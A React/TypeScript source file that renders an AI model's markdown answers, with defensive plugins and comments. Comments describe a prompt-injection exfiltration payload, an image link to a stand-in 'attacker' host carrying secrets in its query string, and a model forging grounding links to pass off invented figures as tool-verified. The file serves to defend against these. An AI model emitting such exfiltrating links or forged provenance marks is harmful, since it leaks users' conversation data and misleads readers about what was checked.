/**
 * Answer rendering.
 *
 * Three remark plugins rewrite the text, and their ORDER matters twice over.
 *
 * `remarkStripReservedLinks` runs FIRST, and it is a security boundary rather than a tidy-up. The
 * two marks below — the grounding overlay and the citation chip — are decided from the link's
 * href, and both schemes are fixed literals. But the text they are read out of is markdown written
 * by the *model*, which is the untrusted party the overlay exists to police: an answer containing
 * `[91.4%](#figure/grounded)` used to paint an invented number with the mark that means a tool
 * returned it, on a turn where no tool returned anything, bypassing `remarkGrounding`'s own
 * "nothing returned, so mark nothing" guard because the forged link never went through it. So the
 * answer's own links in these two schemes are unwrapped before either producer runs, and after
 * that a `#cite/` or `#figure/` href can only have come from the plugins below. Anything added to
 * `plugins` that mints one of these hrefs must go AFTER the stripper.
 *
 * Then `remarkCitations` runs before `remarkGrounding` — it turns note ids into link nodes, so
 * `remarkGrounding`, which skips anything inside a link, cannot then mistake the digits inside
 * `rxn-suzuki-4821` for a measurement.
 *
 * NOTE: `rehype-raw` is deliberately NOT installed. react-markdown does not render raw HTML
 * unless you add it, so the correct sanitisation answer here is "do not enable the hazard" —
 * which also saves pulling in a sanitiser. Answer text is model output; letting it emit HTML
 * would be an XSS hole for no benefit. Please do not add `rehype-raw` to this component.
 */

import { useMemo, type ComponentProps } from 'react';
import ReactMarkdown, { defaultUrlTransform, type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';
import { visit } from 'unist-util-visit';
import type { Node, Parent } from 'unist';
import { CITE_HREF, remarkCitations } from '../lib/citations.ts';
import { mightBeStructure } from '../chem/structure.ts';
import { FIGURE_HREF, remarkGrounding } from '../chem/provenance.ts';
import { CitationChip } from './CitationChip.tsx';
import { InlineSmiles } from './Molecule.tsx';

interface LinkNode extends Node {
  type: 'link';
  url: string;
  children: Node[];
}

/** The href schemes below are this component's own private channel, and nothing the answer says
 *  may enter it. */
const RESERVED_HREFS = [CITE_HREF, FIGURE_HREF] as const;

/**
 * Remark plugin: unwrap any link the *answer* wrote in one of this component's reserved schemes,
 * leaving its text behind.
 *
 * Unwrapping rather than dropping, because the content of such a link is ordinary answer text — a
 * figure, an id — and the reader is entitled to it. What is withdrawn is the claim about it.
 */
function remarkStripReservedLinks() {
  return (tree: Node): void => {
    visit(tree, 'link', (node: LinkNode, index: number | undefined, parent: Parent | undefined) => {
      if (!parent || index === undefined) return;
      if (!RESERVED_HREFS.some((scheme) => node.url.startsWith(scheme))) return;
      parent.children.splice(index, 1, ...(node.children as Parent['children']));
      // Resume at the same index, which now holds what the link contained.
      return index;
    });
  };
}

/**
 * Model-authored headings are demoted two levels: h1 -> h3, h2 -> h4, and so on.
 *
 * The transcript sits under the app's h1 and a per-region h2. An answer that opens with its own
 * `# Heading` would inject a second h1 into the middle of the document and make heading navigation
 * — the primary way a screen-reader user skims a long answer — meaningless. Demoting keeps the
 * outline valid whatever the model emits.
 *
 * The visual size comes from the `.md-h*` class rather than the tag, so the answer looks exactly
 * as it did: `# Heading` still renders largest.
 */
const HEADING_LEVELS = { h1: 'h3', h2: 'h4', h3: 'h5', h4: 'h6', h5: 'h6', h6: 'h6' } as const;

const heading = (from: keyof typeof HEADING_LEVELS) => {
  const Tag = HEADING_LEVELS[from];
  return function Heading({ children, ...props }: React.HTMLAttributes<HTMLHeadingElement>) {
    return (
      <Tag className={`md-${from}`} {...props}>
        {children}
      </Tag>
    );
  };
};

/**
 * One figure in the answer, marked against what the turn's tools returned.
 *
 * Quiet by design. Grounded figures are the overwhelming majority of a good answer, so they get an
 * underline and nothing else — a page of highlighter is a page nobody reads. The unmatched mark is
 * the one that has to be noticed, and it carries the only tone difference.
 *
 * The wording of the unmatched title is load-bearing and deliberately not an accusation.
 * `tool_result.numbers` carries no units, so a figure legitimately converted or derived from a
 * returned value is indistinguishable from an invented one; calling it "unsupported" would be the
 * same false verdict the backend's own grounding check produced nine times out of nine when it
 * over-reached.
 */
function FigureMark({
  grounding,
  children,
}: {
  grounding: string;
  children: React.ReactNode;
}): React.JSX.Element {
  if (grounding === 'grounded') {
    return (
      <span
        className="border-b border-ok/60 bg-ok-soft/60"
        title="This figure matches a value a tool returned this turn."
      >
        {children}
      </span>
    );
  }
  return (
    <span
      className="rounded-sm border-b border-warn/70 bg-warn-soft px-0.5 text-warn-ink"
      title="Not among the values this turn's tools returned. It may be derived or unit-converted from one — check it against the trace."
    >
      {children}
    </span>
  );
}

const components: Components = {
  h1: heading('h1'),
  h2: heading('h2'),
  h3: heading('h3'),
  h4: heading('h4'),
  h5: heading('h5'),
  h6: heading('h6'),

  a({ href, children, ...props }) {
    if (href?.startsWith(CITE_HREF)) {
      // No leading hole in the destructure: `slice` has already removed the `#cite/` prefix, so
      // the first element IS the kind. Skipping it put the kind in `id` and left `id` empty, and
      // every citation chip in a rendered answer therefore came out as an empty button with an
      // "Open " tooltip — the linkified id, which is the whole point of the plugin, was invisible.
      // Nothing caught it because the chip's own tests construct it directly with props.
      const [kind = 'note', id = ''] = href.slice(CITE_HREF.length).split('/');
      return <CitationChip kind={kind} id={id} />;
    }
    if (href?.startsWith(FIGURE_HREF)) {
      return <FigureMark grounding={href.slice(FIGURE_HREF.length)}>{children}</FigureMark>;
    }
    return (
      <a href={href} target="_blank" rel="noreferrer noopener" {...props}>
        {children}
      </a>
    );
  },

  img({ src, alt, ...props }) {
    // Answer text is model output, and a model under prompt injection can emit
    // `![](https://attacker/?q=<secret>)` — the browser then GETs that URL and the query string
    // leaks whatever the model was told to put in the `alt`/path, exfiltrating conversation text.
    // The CSP's `img-src` is the last line, but this component owns the first: an `<img>` is only
    // rendered for a source the app itself produced — an inlined `data:image/`, a `blob:` URL the
    // page minted, or a leading-slash same-origin path. Anything absolute or external (including
    // protocol-relative `//host/...`) is not a load at all; it becomes an inert placeholder that
    // makes the omission visible without ever emitting a `src`.
    const source = typeof src === 'string' ? src : '';
    const isLocal =
      source.startsWith('data:image/') ||
      source.startsWith('blob:') ||
      (source.startsWith('/') && !source.startsWith('//'));
    if (isLocal) {
      return <img src={source} alt={alt ?? ''} {...props} />;
    }
    return (
      <span className="text-muted-fg italic" data-testid="omitted-image">
        [image omitted{alt ? `: ${alt}` : ''}]
      </span>
    );
  },

  code({ className, children, ...props }) {
    const text = String(children ?? '');
    const isBlock = Boolean(className?.startsWith('language-'));
    // An inline code span that looks like a structure gets a render affordance. Block code is
    // left alone — a fenced block is a recipe or a script, not a structure.
    //
    // `mightBeStructure`, not `looksLikeSmiles`: the latter rejects everything containing `>` so
    // that it cannot disagree with the reaction recogniser, which meant every inline reaction
    // SMILES in every answer fell through to plain text — including the ones `similar_reactions`
    // exists to return.
    if (!isBlock && mightBeStructure(text)) {
      return <InlineSmiles smiles={text} />;
    }
    return (
      <code className={className} {...props}>
        {children}
      </code>
    );
  },
};

/**
 * URL sanitiser for both links and images.
 *
 * react-markdown's `defaultUrlTransform` strips every protocol outside a small safe list — which
 * includes `data:` and `blob:`, so a locally inlined image (`data:image/…`) or a page-minted
 * `blob:` URL would arrive at the `img` component as an empty `src` and be dropped even though it
 * is exactly the safe case we want to render. We keep the default for links (`href`) untouched and
 * pass through `data:image/` and `blob:` only for an image `src`; the `img` component below is
 * still the arbiter of what actually renders, so an external `src` remains inert regardless.
 */
function urlTransform(url: string, key: string, node: Readonly<{ tagName?: string }>): string {
  if (
    key === 'src' &&
    node.tagName === 'img' &&
    (url.startsWith('data:image/') || url.startsWith('blob:'))
  ) {
    return url;
  }
  return defaultUrlTransform(url);
}

/** Hoisted so the default does not mint a new array identity on every render, which would defeat
 *  the memo below. */
const NO_FIGURES: readonly number[] = [];

export function Markdown({
  children,
  figures = NO_FIGURES,
}: {
  children: string;
  /** The values this turn's tools returned. Empty — the default, and the case for every caller
   *  that has nothing to check against — disables figure marking entirely rather than painting
   *  every number as unsupported. */
  figures?: readonly number[];
}): React.JSX.Element {
  // The `[plugin, options]` tuple rather than a pre-applied transformer: unified calls a plugin
  // with its options and expects the transformer back, so passing `remarkGrounding(figures)`
  // directly would have unified invoke it a second time — with `undefined` where the tree goes.
  //
  // Memoised because a new array identity on every render would re-parse the whole answer on every
  // parent update, and the parent re-renders once per streamed token of the *next* turn. The type
  // is taken off the component rather than imported from `unified`, which is a transitive
  // dependency this package does not declare.
  const plugins = useMemo<ComponentProps<typeof ReactMarkdown>['remarkPlugins']>(
    () => [remarkGfm, remarkStripReservedLinks, remarkCitations, [remarkGrounding, figures]],
    [figures],
  );

  return (
    <div className="prose-answer">
      <ReactMarkdown
        remarkPlugins={plugins}
        components={components}
        urlTransform={urlTransform}
        // Belt and braces alongside not enabling rehype-raw.
        disallowedElements={['script', 'iframe', 'style', 'object', 'embed', 'form']}
        unwrapDisallowed
      >
        {children}
      </ReactMarkdown>
    </div>
  );
}
